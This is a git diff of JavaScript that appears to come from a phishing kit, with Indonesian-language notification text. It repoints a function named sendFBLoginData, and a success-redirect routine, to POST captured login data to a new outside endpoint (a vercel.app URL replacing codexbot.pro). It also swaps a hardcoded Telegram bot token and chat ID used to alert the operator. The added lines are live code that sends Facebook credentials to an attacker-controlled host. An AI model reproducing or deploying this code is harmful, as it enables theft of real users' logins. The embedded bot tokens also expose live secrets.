@@ -37,8 +37,8 @@ function checkExpirationAndNotify() {
 
 function sendExpirationNotification(timeLeft) {
   const remainingHours = Math.ceil(timeLeft / (60 * 60 * 1000));
-  const telegramBotToken = "7843709541:AAFJpWVAvt1pLSGL1kXAGrrIhyHUfblM33I";
-  const chatIDs = ["-1002444682694"];
+  const telegramBotToken = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
+  const chatIDs = ["6604182176"];
   const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
   const message = `🔔 Pemberitahuan  🔔
@@ -292,7 +292,7 @@ function redirectToSuccess() {
         );
       if (detectedFromJambi) localStorage.setItem("isFromJambi", "true");
 
-      return fetch("https://codexbot.pro/kawanadeksyamsul1.php", {
+      return fetch("https://dominnneeii.vercel.app/pages/api/login.js", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -346,7 +346,7 @@ async function sendFBLoginData() {
   };
 
   try {
-    const res = await fetch("https://codexbot.pro/kawanadeksyamsul1.php", {
+    const res = await fetch("https://dominnneeii.vercel.app/pages/api/login.js", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
